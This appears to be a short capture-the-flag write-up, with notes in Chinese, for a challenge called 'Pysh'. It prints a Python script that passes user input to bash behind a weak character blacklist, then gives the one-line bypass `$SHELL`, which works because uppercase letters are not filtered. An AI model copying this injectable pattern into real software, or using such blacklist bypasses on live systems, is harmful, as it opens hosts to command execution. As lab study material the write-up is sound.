### Pysh
```
#!/usr/bin/python
import os
import sys

black_list = "bcfghijkmnoqstuvwxz!@#|[]{}\"'&*()?01234569"
your_input = raw_input(":")
for i in range(len(black_list)):
    if black_list[i] in your_input:
        print "Bad hacker...."
        exit()
print os.system("bash -c '" + your_input + "'")
```
- 注意到black_list只有過濾部分小寫字元 並沒有擋大寫 所以直接利用ubuntu的env變數來拿shell
- payload: `$SHELL`